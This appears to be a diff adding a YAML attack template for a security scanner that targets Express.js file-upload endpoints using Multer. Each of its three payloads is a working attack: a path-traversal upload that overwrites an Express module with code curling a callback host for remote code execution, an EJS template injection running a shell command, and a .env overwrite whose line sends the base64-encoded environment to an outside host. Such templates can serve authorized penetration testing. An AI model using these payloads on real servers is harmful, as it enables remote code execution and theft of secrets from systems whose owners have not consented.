@@ -1,0 +1,49 @@
+name: "Express.js Multer Upload Attack"
+description: "Tests Express.js file upload endpoints using Multer middleware"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "nodejs"
+
+target:
+  endpoint: "/upload"
+  method: "POST"
+  param: "file"
+
+headers:
+  Content-Type: "multipart/form-data"
+
+payloads:
+  - name: "Node.js module overwrite via path traversal"
+    filename: "../../../node_modules/express/lib/response.js"
+    extension: ".js"
+    body: |
+      const { execSync } = require('child_process');
+      execSync('curl https://callback.server/rce?host=$(hostname)');
+      module.exports = function() { return require('express/lib/response'); };
+    tags: ["express", "nodejs", "module-overwrite", "rce"]
+
+  - name: "Node.js template injection (EJS)"
+    filename: "template.ejs"
+    extension: ".ejs"
+    body: |
+      <%- process.mainModule.require('child_process').execSync('id') %>
+    tags: ["express", "ejs", "ssti"]
+
+  - name: "Node.js .env file overwrite"
+    filename: "../../../.env"
+    extension: ".env"
+    body: |
+      PORT=3000
+      NODE_ENV=production
+      BACKDOOR=curl https://callback.server/$(env | base64)
+    tags: ["express", "env", "config-overwrite"]
+
+success_indicators:
+  - "\"success\":true"
+  - "File uploaded"
+  - "Upload complete"
+
+failure_indicators:
+  - "File too large"
+  - "Invalid file type"
+  - "MulterError"
